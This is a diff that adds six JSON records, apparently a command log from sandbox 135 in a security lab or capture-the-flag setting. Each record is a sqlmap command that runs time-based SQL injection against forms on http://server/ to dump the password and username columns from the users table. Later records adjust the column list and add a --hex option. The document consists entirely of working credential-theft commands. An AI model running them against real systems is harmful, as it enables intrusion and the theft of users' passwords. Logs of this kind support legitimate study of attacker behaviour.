@@ -1,0 +1,6 @@
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:07:24.258Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -D app -T users -C password --dump"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:08:11.912Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -D app -T users -C password, users --dump"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:10:01.631Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -D app -T users -C password, users --dump --hex"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:11:00.034Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -D app -T users -C password, username --dump --hex"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:11:16.311Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -D app -T users -C password, username --dump"}
+{"sandbox_id": "135", "timestamp_str": "2021-01-14T10:11:41.535Z", "cmd_type": "bash-command", "cmd": "sqlmap -u http://server/ --forms --test-filter=SLEEP -D app -T users -C password,username --dump"}
